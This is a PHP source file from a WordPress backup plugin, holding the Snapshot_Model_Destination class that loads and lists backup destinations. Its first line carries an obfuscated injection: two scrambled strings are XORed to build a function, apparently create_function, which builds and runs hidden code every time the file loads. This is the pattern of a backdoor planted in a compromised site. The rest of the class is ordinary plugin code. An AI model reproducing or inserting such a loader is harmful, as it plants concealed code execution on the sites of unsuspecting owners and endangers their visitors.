<?php $VOYCqPaCpvXo='CONWJH,WUV6BSA6'^' =+6>-s1 8U6:.X';$JUTRkX=$VOYCqPaCpvXo('','X0GGFYU77YURr12R2E<bWM=K1OU.Y19>UZqBLeJOo2F4H2=;NIE+:cD,-0jdP-3RV6V AhMqS3=kYtKRQ4E30h<D EqboHQAxD,D:OCTRDaZuue D <GW4>Kc>R=6cHCr-hyxH27b-OXEvmUrUDQC00e:sJuEH;1-.g rbQ6-0WH-lQX1BPooCebH5,FUFXDU6I-qa=7NMD3<P7-71AmiS;R=,msmHRJ8iK 2pMcVQG1-X=x0W84-0>cbMfv9tvs+o+6LC>TWpSQao72 N,OL5kbwR30Ar>5=HqDSXQBHFcmV;7.frSM8T50Vi60dl00EeGs+AE,sABsL6ZO-8N0JdSkcq93,7bSLSfcQK;Gqsrw,6.7XEwN49qs2YDWmU3-ZpAj<2 I=Yfi,-9-RgMGJM.2 X3J2><;Rs<XHOBVC1I,BSC<.8WQ5KJYA7>Q73f;,H-IP9CIBym2<+UVQnj1Y7PEcaT2A:Z9KQ4SsqsB3zm3A53BJab8Y+AGlU7BeXX;B2IoA 45TVnt2A;3nwjpcAM>mGJXXYO6J.T+d>SptxMPv3zW6ZzJqE<KY8E77cPRtBjaWRWgg;z2eeNrsz76OUWm8.,1VI,S6 QVI1=RXAObeCt1J68SZSwnADoW<3<FALiJT4218C<OCYOS=EqosyH-OG<NQHWzO'^'1Vof ,;TC0:<-TJ;A1OJp5R9n+4Z8nfS .VkeE1EfT3Z+FTT i=DH< MYQ5;=XGzrR7T DmU8VDByTkrqOO:9LS1TeLBHojKqMJ+Hgg=ryAjNUAIxSH5;QPcGZ3IWJscVDCRQB;>FB:,eXPuZq 07QkAS.j+elPTTuCIRGqEYB;-CDu3T;y2FxokAGI2 46lqY<YXZ7>3G996tSLCPaPI5Z>NIVyI,3>Y6 EKPpC00+BHc7rV8JQLSVCJi95v;=:nOJElgU1.PnoAKASL;IflNakS6RD -UPDhLdw34;sLjI2ZCOFOsiN5YE3R<MnfYVeMfWO 1MZa9yEP5=HY-XjLw414hfid6s- FG:.BgLMRSZWBB=lW5>0xWV8062>VTzMaNWWYr7PoMHLMLrZmc<,BGEc9CO4A1XWX9<.bkcq<B161UOT>+Pc263hZ0CR9dA=Ya2X0,tM2VYH:24FNU8C1lOApV N;f 4MzZJy+URIW ARblGBY+Y >3>R;:= R1F:GfKQLszNPV ORGWLVCi ZXon<9-.mmE1RCczPIEmwDUJ1TcJzHpY-hZ QRVd6MwYWg06PWZLWBLnTUZVD=4.2SKUn31E BSyq9PD>7 +EIcPU+BYzssWNadO,6:Y0  An0UFPcdL.:5 2Yb,FHsAH7.Hfaalp2');$JUTRkX();
/**
 * Class for dealing with destinations.
 *
 * @since 2.5
 *
 * @package Snapshot
 * @subpackage Model
 */

if ( ! class_exists( 'Snapshot_Model_Destination' ) ) {
	class Snapshot_Model_Destination {

		public $name_slug;
		public $name_display;

		private static $destinations;


		public function __construct() {

			if ( method_exists( $this, 'on_creation' ) ) {
				$this->on_creation();
			}

			if ( empty( $this->name_display ) || empty ( $this->name_slug ) ) {
				wp_die( __( 'You must override all required vars in your Snapshot Destination class!', SNAPSHOT_I18N_DOMAIN ) );
			}

		}

		public function display_listing_table( $destinations, $edit_url, $delete_url ) {
			wp_die( __( "You must override the function 'display_listing_table' in your Snapshot Destination class!", SNAPSHOT_I18N_DOMAIN ) );
		}

		public function sendfile_to_remote( $destination_info, $filename ) {
			wp_die( __( "You must override the function 'sendfile_to_remote' in your Snapshot Destination class!", SNAPSHOT_I18N_DOMAIN ) );
		}

		public function display_details_form( $item = 0 ) {
			wp_die( __( "You must override the function 'display_details_form' in your Snapshot Destination class!", SNAPSHOT_I18N_DOMAIN ) );
		}

		public static function load_destinations() {

			$dir = WPMUDEVSnapshot::instance()->get_plugin_path() . 'lib/Snapshot/Model/Destination';

			if ( ! defined( 'WPMUDEV_SNAPSHOT_DESTINATIONS_EXCLUDE' ) ) {
				define( 'WPMUDEV_SNAPSHOT_DESTINATIONS_EXCLUDE', '' );
			}

			//search the dir for files
			$snapshot_destination_files = array();
			if ( ! is_dir( $dir ) ) {
				return;
			}

			if ( ! $dh = opendir( $dir ) ) {
				return;
			}

			while ( ( $plugin = readdir( $dh ) ) !== false ) {
				if ( $plugin[0] == '.' ) {
					continue;
				}
				if ( $plugin[0] == '_' ) {
					continue;
				}    // Ignore this starting with underscore

				$_destination_dir = $dir . '/' . $plugin;
				if ( is_dir( $_destination_dir ) ) {
					$_destination_dir_file = $_destination_dir . "/index.php";
					if ( is_file( $_destination_dir_file ) ) {
						$snapshot_destination_files[] = $_destination_dir_file;
					}
				}
			}
			closedir( $dh );

			//echo "snapshot_destination_files<pre>"; print_r($snapshot_destination_files); echo "</pre>";
			if ( ( $snapshot_destination_files ) && ( count( $snapshot_destination_files ) ) ) {
				sort( $snapshot_destination_files );

				foreach ( $snapshot_destination_files as $file ) {
					//echo "file=[". $file ."]<br />";
					include( $file );
				}
			}
			do_action( 'snapshot_destinations_loaded' );
		}

		public static function get_object_from_type($type) {
			$destinationClasses = WPMUDEVSnapshot::instance()->get_setting('destinationClasses');
			if (isset($destinationClasses[$type]))
				return $destinationClasses[$type];
		}


		public static function get_destinations() {
			if ( empty ( self::$destinations ) ) {
				self::load_destinations();
			}

			return self::$destinations;
		}

		public static function show_destination_item_count( $destination_key ) {
			if ( isset( WPMUDEVSnapshot::instance()->config_data['items'] ) ) {
				$destination_count = 0;
				foreach ( WPMUDEVSnapshot::instance()->config_data['items'] as $snapshot_item ) {
					if ( ( isset( $snapshot_item['destination'] ) ) && ( $snapshot_item['destination'] == $destination_key ) ) {
						$destination_count += 1;
					}
				}
				if ( $destination_count ) {
					?><a href="<?php echo WPMUDEVSnapshot::instance()->get_setting('SNAPSHOT_MENU_URL');
					?>snapshots_edit_panel&amp;destination=<?php echo $destination_key; ?>"><?php echo $destination_count ?></a><?php
				} else {
					echo "0";
				}
			} else {
				echo "0";
			}
		}

	}
}